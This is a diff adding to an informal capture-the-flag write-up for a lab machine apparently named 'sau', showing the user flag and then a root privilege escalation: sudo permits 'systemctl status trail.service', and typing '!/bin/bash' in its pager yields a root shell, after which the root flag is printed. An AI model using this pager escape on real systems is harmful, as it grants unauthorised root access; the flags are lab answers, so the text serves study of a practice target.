@@ -33,3 +33,15 @@ pwd:
 moving to home directory /home/puma and i see the user flag:
     9699926e8497a96fe1d0c484683a6151
 
+after that we using sudo -l
+    User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+
+after entering the command sudo /usr/bin/systemctl status trail.service we get the vulnerable shell that warns me that terminal is not fully functional
+    WARNING: terminal is not fully functional
+-  (press RETURN)
+
+all i need to do is to add to it !/bin/bash and now im root
+
+cd /root and root flag is 4bb51e32e06aae918b2e3bce42233ab4
+
